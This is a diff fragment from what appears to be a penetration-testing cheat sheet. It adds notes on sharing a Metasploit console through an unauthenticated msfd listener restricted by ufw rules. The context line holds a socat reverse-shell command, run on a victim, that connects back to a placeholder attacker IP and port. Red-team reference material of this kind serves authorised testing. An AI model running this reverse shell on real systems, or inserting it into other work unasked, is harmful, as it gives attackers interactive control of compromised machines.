@@ -543,3 +543,17 @@ On victim:
 ~~~
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[attack_ip]:4444
 ~~~
+
+### Metasploit session sharing through msfd
+
+Unauthenticated way to share msf console for session sharing.
+One host run 
+~~~
+msfd -a 0.0.0.0
+~~~
+then configure ufw with ips of systems you want to allow access to the console. 
+~~~
+#ufw for msfd
+Ufw enable 
+Ufw allow from <ip> to any port 5554
+~~~
